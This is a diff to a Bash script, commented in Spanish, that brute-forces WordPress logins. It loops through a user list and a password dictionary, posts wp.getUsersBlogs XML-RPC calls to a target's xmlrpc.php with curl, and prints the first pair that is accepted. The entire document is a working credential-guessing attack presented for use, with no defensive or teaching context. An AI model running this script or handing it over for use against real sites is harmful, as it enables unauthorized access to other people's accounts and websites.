@@ -1,54 +1,32 @@
 #!/bin/bash
 
 if [[ -z $@ ]]; then
-	echo -e "\n\tUso: $0 <host> <diccionario>"
-	exit 1
+  echo "Modo de uso: $0 [HOST] [DICCIONARIO]"
 fi
 
 host="$1"
-diccionario="$2"
+dict="$2"
 
-function ctrl_c(){
-	echo -e "\n[!] Saliendo. . .\n"
-	exit 1
+for user in $(cat usuarios-wp.txt); do
+	for psw in $(cat $dict); do 
+		echo " 
+		<methodCall>
+			<methodName>wp.getUsersBlogs</methodName>
+			<params>
+				<param><value>$user</value></param>
+				<param><value>$psw</value></param>
+				</params>
+		</methodCall>
+		" > datos.xml
+		echo "Probando $user:$psw"
 
-}
+		if [[ ! $(curl -s "$host/xmlrpc.php" -d @"datos.xml" | grep "Incorrect" &)  ]]; then
+			echo "[+] $user:$psw"
+			rm datos.xml
+			exit 0
+		fi; wait
 
-trap ctrl_c INT
+		rm datos.xml
 
-declare -r xmlrpc_url="$host/xmlrpc.php"
-declare -r data_xml_file="data.xml"
-
-function borrar_arch(){
-	rm $data_xml_file 2>/dev/null
-}
-
-for username in $(cat usuarios-wp.txt); do
-
-
-
-    for password in $(cat $diccionario); do
-
-cat << EOF > $data_xml_file
-<methodCall>
-	<methodName>wp.getUsersBlogs</methodName>
-	<params>
-		<param><value>$username</value></param>
-		<param><value>$password</value></param>
-	</params>
-</methodCall>
-EOF
-
-        echo "Probando $username:$password. . ."
-	    curl -s $xmlrpc_url -X POST -d @$data_xml_file | grep "incorrectos" &> /dev/null
-
-	    if [ "$(echo $?)" != 1 ]; then
-		    echo -e "\n[+] La contraseña es $password\n"
-		    borrar_arch
-		    exit 0;
-	    fi
-	    borrar_arch
-
-    done;
-
-done;
+	done
+done
